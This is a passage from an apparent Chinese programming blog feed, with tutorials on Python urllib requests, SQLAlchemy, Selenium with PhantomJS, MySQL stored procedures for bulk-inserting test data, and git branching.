f.status, f.reason)</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> f.getheaders():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'%s: %s'</span> % (k, v))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'Data:'</span>, data.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p>返回的数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">        Status: 200 OK</span><br><span class="line">        Server: GitHub.com</span><br><span class="line">        Content-Type: text/html; charset=utf-8</span><br><span class="line">        Last-Modified: Fri, 15 Sep 2017 07:46:08 GMT</span><br><span class="line">        Access-Control-Allow-Origin: *</span><br><span class="line">        Expires: Mon, 18 Sep 2017 12:32:11 GMT</span><br><span class="line">        Cache-Control: max-age=600</span><br><span class="line">        X-GitHub-Request-Id: FB08:1BE59:9D17C9:A847F6:59BFBA73</span><br><span class="line">        Content-Length: 54654</span><br><span class="line">        Accept-Ranges: bytes</span><br><span class="line">        Date: Mon, 18 Sep 2017 12:22:33 GMT</span><br><span class="line">        Via: 1.1 varnish</span><br><span class="line">        Age: 22</span><br><span class="line">        Connection: close</span><br><span class="line">        X-Served-By: cache-nrt6127-NRT</span><br><span class="line">        X-Cache: HIT</span><br><span class="line">        X-Cache-Hits: 1</span><br><span class="line">        X-Timer: S1505737353.341276,VS0,VE0</span><br><span class="line">        Vary: Accept-Encoding</span><br><span class="line">        X-Fastly-Request-ID: 299a3b861b72e86f3de4532787edfd2bbde20512</span><br><span class="line">``` </span><br><span class="line">可以在访问的时候，模拟浏览器发送get请求</span><br><span class="line">使用Request对象，通过往Request对象添加HTTP头，我们就可以把请求伪装成浏览器。例如，模拟iPhone 6去请求本站主页</span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    from urllib import request</span><br><span class="line">    req = request.Request(<span class="string">'http://xhzyxed.cn'</span>)</span><br><span class="line">    req.add_header(<span class="string">'User-Agent'</span>, <span class="string">'Mozilla/6.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/8.0 Mobile/10A5376e Safari/8536.25'</span>)</span><br><span class="line">    with request.urlopen(req) as f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'Status:'</span>, f.status, f.reason)</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> f.getheaders():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'%s: %s'</span> % (k, v))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'Data:'</span>, f.read().decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure></p><ul><li>post<br>如果要以POST发送一个请求，只需要把参数data以bytes形式传入。</li></ul><p>我们模拟一个微博登录，先读取登录的邮箱和口令，然后按照weibo.cn的登录页的格式以username=xxx&amp;password=xxx的编码传入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">    from urllib import request, parse</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'Login to weibo.cn...'</span>)</span><br><span class="line">    email = input(<span class="string">'Email: '</span>)</span><br><span class="line">    passwd = input(<span class="string">'Password: '</span>)</span><br><span class="line">    login_data = parse.urlencode([</span><br><span class="line">        (<span class="string">'username'</span>, email),</span><br><span class="line">        (<span class="string">'password'</span>, passwd),</span><br><span class="line">        (<span class="string">'entry'</span>, <span class="string">'mweibo'</span>),</span><br><span class="line">        (<span class="string">'client_id'</span>, <span class="string">''</span>),</span><br><span class="line">        (<span class="string">'savestate'</span>, <span class="string">'1'</span>),</span><br><span class="line">        (<span class="string">'ec'</span>, <span class="string">''</span>),</span><br><span class="line">        (<span class="string">'pagerefer'</span>, <span class="string">'https://passport.weibo.cn/signin/welcome?entry=mweibo&amp;r=http%3A%2F%2Fm.weibo.cn%2F'</span>)</span><br><span class="line">    ])</span><br><span class="line">    req = request.Request(<span class="string">'https://passport.weibo.cn/sso/login'</span>)</span><br><span class="line">    req.add_header(<span class="string">'Origin'</span>, <span class="string">'https://passport.weibo.cn'</span>)</span><br><span class="line">    req.add_header(<span class="string">'User-Agent'</span>, <span class="string">'Mozilla/6.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/8.0 Mobile/10A5376e Safari/8536.25'</span>)</span><br><span class="line">    req.add_header(<span class="string">'Referer'</span>, <span class="string">'https://passport.weibo.cn/signin/login?entry=mweibo&amp;res=wel&amp;wm=3349&amp;r=http%3A%2F%2Fm.weibo.cn%2F'</span>)</span><br><span class="line">    </span><br><span class="line">    with request.urlopen(req, data=login_data.encode(<span class="string">'utf-8'</span>)) as f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'Status:'</span>, f.status, f.reason)</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> f.getheaders():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'%s: %s'</span> % (k, v))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'Data:'</span>, f.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line"> ```       </span><br><span class="line"><span class="comment">## 使用chardet包</span></span><br><span class="line"></span><br><span class="line">在处理字符串时，常常会遇到不知道字符串是何种编码，比如我们抓取网页的时候，需要将网页以合理的方式编码，如果不知道字符串的编码就不能将字符串转换成需要的编码。面对多种不同编码的输入方式，是否会有一种有效的编码方式？chardet是一个非常优秀的编码识别模块。</span><br><span class="line">可以在网上查找其用法。</span><br><span class="line"></span><br><span class="line"><span class="comment">## 使用beautifulsoup</span></span><br><span class="line"></span><br><span class="line">通俗易懂的[网上官方文档](https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 使用sqlalchemy</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 安装</span></span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    pip install sqlalchemy</span><br><span class="line">```    </span><br><span class="line"><span class="comment">### 连接数据库</span></span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    create_engine(数据库://用户名:密码(没有密码则为空)@主机名:端口/数据库名<span class="string">',echo =True)</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">    from sqlalchemy import Column,String,Integer,create_engine</span></span><br><span class="line"><span class="string">    from sqlalchemy.ext.declarative import declarative_base</span></span><br><span class="line"><span class="string">    from sqlalchemy.orm import sessionmaker</span></span><br><span class="line"><span class="string">    # 创建对象的基类:</span></span><br><span class="line"><span class="string">    Base = declarative_base()</span></span><br><span class="line"><span class="string">    class Test(Base):</span></span><br><span class="line"><span class="string">        __tablename__='</span><span class="built_in">test</span><span class="string">'</span></span><br><span class="line"><span class="string">        id = Column(Integer, primary_key=True,autoincrement=True)</span></span><br><span class="line"><span class="string">        name=Column(String(length=50),nullable=False)</span></span><br><span class="line"><span class="string">    engine=create_engine('</span>mysql+pymysql://root:hi23456@localhost/pythonleran?charset=utf8<span class="string">')</span></span><br><span class="line"><span class="string"> ```    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### 增查改操作</span></span><br><span class="line"><span class="string">-增加记录</span></span><br><span class="line"><span class="string">``` bash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      # 创建DBSession类型:</span></span><br><span class="line"><span class="string">        DBSession = sessionmaker(bind=engine)</span></span><br><span class="line"><span class="string">        session = DBSession()</span></span><br><span class="line"><span class="string">        new_test=Test(id='</span>6<span class="string">',name='</span>seven<span class="string">')</span></span><br><span class="line"><span class="string">        session.add(new_test)</span></span><br><span class="line"><span class="string">        session.commit()</span></span><br><span class="line"><span class="string">        session.close()</span></span><br></pre></td></tr></table></figure></p><ul><li>查询<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DBSession = sessionmaker(<span class="built_in">bind</span>=engine)</span><br><span class="line">session = DBSession()</span><br><span class="line"><span class="built_in">test</span>=session.query(Test).filter(Test.id&gt;<span class="string">'1'</span>).order_by(Test.id).all()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">test</span>)</span><br><span class="line">session.commit()</span><br><span class="line">session.close()</span><br></pre></td></tr></table></figure></li></ul><p>自定义参数查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DBSession = sessionmaker(<span class="built_in">bind</span>=engine)</span><br><span class="line">session = DBSession()</span><br><span class="line"><span class="built_in">test</span>=session.query(Test).filter(text(<span class="string">"news_id=:id and name=rename"</span>)).params(id=1,rename=<span class="string">"seven"</span>).all()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">test</span>)</span><br><span class="line">session.commit()</span><br><span class="line">session.close()</span><br></pre></td></tr></table></figure></p><ul><li>改<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DBSession = sessionmaker(<span class="built_in">bind</span>=engine)</span><br><span class="line">session = DBSession()</span><br><span class="line"><span class="built_in">test</span>=session.query(Test).filter(Test.id&gt;<span class="string">'1'</span>).update(&#123;<span class="string">"name"</span>:<span class="string">"sevenhhh"</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">test</span>)</span><br><span class="line">session.commit()</span><br><span class="line">session.close()</span><br></pre></td></tr></table></figure></li></ul><h3 id="自动生成orm实体"><a href="#自动生成orm实体" class="headerlink" title="自动生成orm实体"></a>自动生成orm实体</h3><p>像我们上面写的映射类Test使用了<br>pip安装sqlcodegen<br>cd到项目目中在终端执行:<br>sqlacodegen –tables [表名] –outfile [输出的映射文件路径] [数据库链接]<br>如:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sqlacodegen --tables myfund --outfile Fund.py mysql+pymysql://root:hi23456@localhost/pythonleran?charset=utf8</span><br></pre></td></tr></table></figure></p><h2 id="使用phantomsjs-selenlum"><a href="#使用phantomsjs-selenlum" class="headerlink" title="使用phantomsjs+selenlum"></a>使用phantomsjs+selenlum</h2><p>安装下载phantomsjs <a href="http://phantomjs.org/download.html" target="_blank" rel="noopener">下载</a><br>PhantomJS是一个基于webkit的JavaScript API。它使用QtWebKit作为它核心浏览器的功能，使用webkit来编译解释执行JavaScript代码。任何你可以在基于webkit浏览器做的事情，它都能做到。它不仅是个隐形的浏览器，提供了诸如CSS选择器、支持Web标准、DOM操作、JSON、HTML5、Canvas、SVG等，同时也提供了处理文件I/O的操作，从而使你可以向操作系统读写文件等。PhantomJS的用处可谓非常广泛，诸如网络监测、网页截屏、无需浏览器的 Web 测试、页面访问自动化等。</p><p>安装selenlum<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pip install selenum</span><br></pre></td></tr></table></figure></p><p>Selenium也是一个用于Web应用程序测试的工具。Selenium测试直接运行在浏览器中，就像真正的用户在操作一样。支持的浏览器包括IE、Mozilla Firefox、Mozilla Suite等。这个工具的主要功能包括：测试与浏览器的兼容性——测试你的应用程序看是否能够很好得工作在不同浏览器和操作系统之上。测试系统功能——创建衰退测试检验软件功能和用户需求。支持自动录制动作和自动生成。Net、Java、Perl等不同语言的测试脚本。Selenium 是ThoughtWorks专门为Web应用程序编写的一个验收测试工具。</p><p>简单使用:模拟使用百度搜索java<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.support.ui import  WebDriverWait</span><br><span class="line">from selenium.webdriver.support import expected_conditions</span><br><span class="line">driver=webdriver.PhantomJS()</span><br><span class="line">driver.get(<span class="string">"https://www.baidu.com/"</span>)</span><br><span class="line">searchText=driver.find_element_by_id(<span class="string">"kw"</span>)</span><br><span class="line">searchText.send_keys(<span class="string">'java'</span>)</span><br><span class="line">searchBtn=driver.find_element_by_id(<span class="string">'su'</span>)</span><br><span class="line">searchBtn.click()</span><br><span class="line">WebDriverWait(driver,20).until(expected_conditions.title_contains(<span class="string">"java"</span>))</span><br><span class="line"><span class="built_in">print</span>(driver.page_source)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql-1 往mysql灌入一百万数据</title>
      <link href="/2017/09/10/%E5%BE%80mysql%E7%81%8C%E5%85%A5%E4%B8%80%E7%99%BE%E4%B8%87%E6%95%B0%E6%8D%AE/"/>
      <url>/2017/09/10/%E5%BE%80mysql%E7%81%8C%E5%85%A5%E4%B8%80%E7%99%BE%E4%B8%87%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<p>平时，如果只能接触到少量的数据的话，对于自己的成长是非常不利的，而且也没有大数据下处理的优化相关经验，那么既然没有大量的实际数据，我们自己创建大量的数据，那么在这一节当中，将利用mysql的存储过程往数据库中插入100万数据，带你了解直接使用mysql插入大量的数据。<br><a id="more"></a></p><h1 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h1><h2 id="什么是存储过程"><a href="#什么是存储过程" class="headerlink" title="什么是存储过程"></a>什么是存储过程</h2><p>其实，我们常用的数据库语言dml，ddl在执行的时候都是需要先编译然后再执行，而存储过程就是为了完成特定功能的sql语句集合，经编译后存储在数据库中，用户通过制定存储过程的名字并且可以给定参数来调用执行它，调用方式就像我们使用php语言调用函数一样。</p><h2 id="存储过程优点"><a href="#存储过程优点" class="headerlink" title="存储过程优点"></a>存储过程优点</h2><ul><li>因为它可以使用类似php语言的控制语句，增强了sql的功能性和灵活性</li><li>可以重复使用</li><li>可以作为安全机制来利用，避免非授权用户对数句的访问</li></ul><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="参数的定义"><a href="#参数的定义" class="headerlink" title="参数的定义"></a>参数的定义</h3><p>创建存储过程的时候类似我们创建一个函数，具体语法如下:<br>CREATE PROCEDURE([[IN |OUT |INOUT ] 参数名 数据类形…]),可接收的参数类型有三种</p><ul><li>IN 输入参数:表示该参数的值必须在调用存储过程时指定，在存储过程中修改该参数的值不能被返回，为默认值<br>例子:<br>CREATE PROCEDURE demo_in_parameter(IN p_in int)<br>BEGIN<br>SELECT p_in;<br>SET p_in=2;<br>SELECT p_in;<br>END;<br>执行:<br>SET @p_in=1;<br>CALL demo_in_parameter(@p_in);<br>执行结果:<br>+——+<br>| p_in |<br>+——+<br>|   1  |<br>+——+<br>+——+<br>| p_in |<br>+——+<br>|   2  |<br>+——+<br>再执行<br>SELECT @p_in;<br>返回:<br>+——-+<br>| @p_in |<br>+——-+<br>|  1    |<br>+——-+<br>以上可以看出，p_in虽然在存储过程中被修改，但并不影响@p_id的值</li><li>OUT 输出参数:该值可在存储过程内部被改变，并可返回<br>例子:<br>CREATE PROCEDURE demo_in_parameter(OUT p_in int)<br>BEGIN<br>SELECT p_in;<br>SET p_in=2;<br>SELECT p_in;<br>END;<br>执行:<br>SET @p_in=1;<br>CALL demo_in_parameter(@p_in);<br>执行结果:<br>+——+<br>| p_in |<br>+——+<br>|   1  |<br>+——+<br>+——+<br>| p_in |<br>+——+<br>|   2  |<br>+——+<br>再执行<br>SELECT @p_in;<br>返回:<br>+——-+<br>| @p_in |<br>+——-+<br>|  2    |<br>+——-+<br>以上可以看出，p_in在存储过程中被修改， @p_in也被修改了</li><li>INOUT 输入输出参数:调用时指定，并且可被改变和返回</li></ul><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h4><p>DECLARE variable_name [,variable_name…] datatype [DEFAULT value];<br>如: DECLARE l_int int unsigned default 4000000;</p><h4 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h4><p>SET 变量名 = 表达式值</p><h4 id="用户变量"><a href="#用户变量" class="headerlink" title="用户变量"></a>用户变量</h4><p>①用户变量名一般以@开头<br>②滥用用户变量会导致程序难以理解及管理</p><h3 id="存储过程的删查改"><a href="#存储过程的删查改" class="headerlink" title="存储过程的删查改"></a>存储过程的删查改</h3><p>查:<br>show procedure status where db=’数据库名’;<br>查看存储过程的详细:<br>SHOW CREATE PROCEDURE 数据库.存储过程名;<br>删:<br>DROP PROCEDURE<br>改:<br>ALTER PROCEDURE</p><h3 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h3><h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">            <span class="keyword">if</span>-then -<span class="keyword">else</span>语句</span><br><span class="line">            BEGIN</span><br><span class="line">            <span class="keyword">if</span> t=1 THEN</span><br><span class="line">            INSERT INTO user_sys(user_name,user_pwd)VALUES(CONCAT(<span class="string">'user'</span>,@num),<span class="string">'123'</span>);</span><br><span class="line">            SET @num=@num+1;</span><br><span class="line">            ELSE</span><br><span class="line">            INSERT INTO user_sys2(user_name,user_pwd)VALUES(CONCAT(<span class="string">'user'</span>,@num),<span class="string">'123'</span>);</span><br><span class="line">            SET @num=@num+1;</span><br><span class="line">            END IF;</span><br><span class="line">            END;</span><br><span class="line">```            </span><br><span class="line"><span class="comment">#### 循环语句</span></span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">            BEGIN</span><br><span class="line">            WHILE @num&lt;1000000 DO</span><br><span class="line">            <span class="keyword">if</span> t=1 THEN</span><br><span class="line">            INSERT INTO user_sys(user_name,user_pwd)VALUES(CONCAT(<span class="string">'user'</span>,@num),<span class="string">'123'</span>);</span><br><span class="line">            SET @num=@num+1;</span><br><span class="line">            ELSE</span><br><span class="line">            INSERT INTO user_sys2(user_name,user_pwd)VALUES(CONCAT(<span class="string">'user'</span>,@num),<span class="string">'123'</span>);</span><br><span class="line">            SET @num=@num+1;</span><br><span class="line">            END IF;</span><br><span class="line">            END WHILE;</span><br><span class="line">            END;</span><br></pre></td></tr></table></figure><h4 id="case语句"><a href="#case语句" class="headerlink" title="case语句"></a>case语句</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">         begin </span><br><span class="line">         <span class="built_in">declare</span> var int;  </span><br><span class="line">         <span class="built_in">set</span> var=parameter+1;  </span><br><span class="line">         <span class="keyword">case</span> var  </span><br><span class="line">         when 0 <span class="keyword">then</span>   </span><br><span class="line">         insert into t values(17);  </span><br><span class="line">         when 1 <span class="keyword">then</span>   </span><br><span class="line">         insert into t values(18);  </span><br><span class="line">         <span class="keyword">else</span>   </span><br><span class="line">         insert into t values(19);  </span><br><span class="line">         end <span class="keyword">case</span>;  </span><br><span class="line">         end;  </span><br><span class="line"> ```        </span><br><span class="line"><span class="comment">### 基本存储函数</span></span><br><span class="line"></span><br><span class="line">(1).字符串类</span><br><span class="line">(2).数学类</span><br><span class="line">(3).日期时间类</span><br><span class="line">上述基本存储函数自己可以查找资料</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实战 使用存储过程往数据库灌入100万数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 创建两张表</span></span><br><span class="line"></span><br><span class="line">一张表引擎为MyISAM，一张为Innodb,便于比较性能</span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    CREATE TABLE `user_sys` (</span><br><span class="line">      `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">      `user_name` varchar(20) NOT NULL,</span><br><span class="line">      `user_pwd` varchar(30) NOT NULL,</span><br><span class="line">      `user_regdate` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,</span><br><span class="line">      PRIMARY KEY (`id`)</span><br><span class="line">    ) ENGINE=MyISAM AUTO_INCREMENT=1000019 DEFAULT CHARSET=utf8;</span><br><span class="line">    </span><br><span class="line">    CREATE TABLE `user_sys2` (</span><br><span class="line">      `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">      `user_name` varchar(20) NOT NULL,</span><br><span class="line">      `user_pwd` varchar(30) NOT NULL,</span><br><span class="line">      `user_regdate` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,</span><br><span class="line">      PRIMARY KEY (`id`)</span><br><span class="line">    ) ENGINE=InnoDB AUTO_INCREMENT=1000019 DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><h2 id="编写存储过程"><a href="#编写存储过程" class="headerlink" title="编写存储过程"></a>编写存储过程</h2><pre><code class="bash">CREATE PROCEDURE demo_in_parameter(IN t int)     BEGIN        <span class="comment">#Routine body goes here...</span>        <span class="built_in">set</span> @num=1;        WHILE @num&lt;1000000 DO            <span class="keyword">if</span> t=1 THEN            INSERT INTO user_sys(user_name,user_pwd)VALUES(CONCAT(<span class="string">'user'</span>,@num),<span class="string">'123'</span>);            SET @num=@num+1;            ELSE            INSERT INTO user_sys2(user_name,user_pwd)VALUES(CONCAT(<span class="string">'user'</span>,@num),<span class="string">'123'</span>);            SET @num=@num+1;            END IF;        END WHILE;    END</code></pre><p>执行调用</p><ul><li><p>调用引擎为MyISAM</p><pre><code class="bash">CALL initdb(1)</code></pre><p>执行时间:<br><img src="myisam.png" alt="myisam"></p></li><li><p>调用引擎为InnoDB</p><pre><code class="bash">CALL initdb(2)</code></pre><p><img src="inodb.png" alt="innodb"></p></li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>Innodb引擎支持事务，MyISAM写入数据的性能比较好</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>你应该要知道的git使用</title>
      <link href="/2017/09/07/%E4%BD%A0%E5%BA%94%E8%AF%A5%E8%A6%81%E7%9F%A5%E9%81%93%E7%9A%84git%E4%BD%BF%E7%94%A8/"/>
      <url>/2017/09/07/%E4%BD%A0%E5%BA%94%E8%AF%A5%E8%A6%81%E7%9F%A5%E9%81%93%E7%9A%84git%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h1><p>在开发软件时，可能有多人同时为同一个软件开发功能或修复BUG，可能存在多个Release版本，并且需要对各个版本进行维护。</p><h2 id="什么是分支"><a href="#什么是分支" class="headerlink" title="什么是分支"></a>什么是分支</h2><p>分支是为了将修改记录的整体流程分叉保存。分叉后的分支不受其他分支的影响，所以在同一个数据库里可以同时进行多个修改。<br><img src="分支1.png" alt=""><br>此外，分叉的分支可以合并<br><img src="分支2.png" alt=""></p><h2 id="master分支"><a href="#master分支" class="headerlink" title="master分支"></a>master分支</h2><p>在数据库进行最初的提交后, Git会创建一个名为master的分支。因此之后的提交，在切换分支之前都会添加到master分支里<br><img src="分支3.png" alt=""></p><h2 id="merge分支和topic分支的运用"><a href="#merge分支和topic分支的运用" class="headerlink" title="merge分支和topic分支的运用"></a>merge分支和topic分支的运用</h2><p>merge分支</p><blockquote><p>Merge分支是为了可以随时发布release而创建的分支，它还能作为Topic分支的源分支使用。保持分支稳定的状态是很重要的。如果要进行更改，通常先创建Topic分支，而针对该分支，可以使用Jenkins之类的CI工具进行自动化编译以及测试。<br>  通常，大家会将master分支当作Merge分支使用。</p></blockquote><p>topic分支</p><blockquote><p>Topic分支是为了开发新功能或修复Bug等任务而建立的分支。若要同时进行多个的任务，请创建多个的Topic分支。<br> Topic分支是从稳定的Merge分支创建的。完成作业后，要把Topic分支合并回Merge分支。</p></blockquote><h2 id="分支的切换"><a href="#分支的切换" class="headerlink" title="分支的切换"></a>分支的切换</h2><p>checkout操作就可以切换作业的分支，checkout之后的提交记录将被追加到目标分支。</p><h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><p>HEAD指向的是现在使用中的分支的最后一次更新。通常默认指向master分支的最后一次更新。通过移动HEAD，就可以变更使用的分支。<br><img src="分支4.png" alt=""></p><p>提交时使用~(tilde)和^(caret)就可以指定某个提交的相对位置<br>HEAD后面加上~(tilde）可以指定HEAD之前的提交记录<br>“^”代表父提交,当一个提交有多个父提交时，可以通过在”^”后面跟上一个数字，表示第几个父提交，”^”相当于”^1”<br>~<n>相当于连续的<n>个”^”</n></n></p><h3 id="statsh"><a href="#statsh" class="headerlink" title="statsh"></a>statsh</h3><p>还未提交的修改内容以及新添加的文件，留在索引区域或工作树的情况下切换到其他的分支时，可以先保存当前的内容切换到其他分支，做完其他分支之后，可以切换到原来的分支，回复暂存的内容继续开发</p><ul><li>暂存内容<br>git stash</li><li>恢复内容<br>切换到分支之后，执行<br>git stash pop，可以恢复暂存的东西</li></ul><h3 id="分支的合并"><a href="#分支的合并" class="headerlink" title="分支的合并"></a>分支的合并</h3><p>合并分支有2种方法：使用merge或rebase</p><p>merge合并</p><ul><li>fast-forward（快进）合并</li></ul><p><img src="分支5.png" alt=""><br><img src="分支6.png" 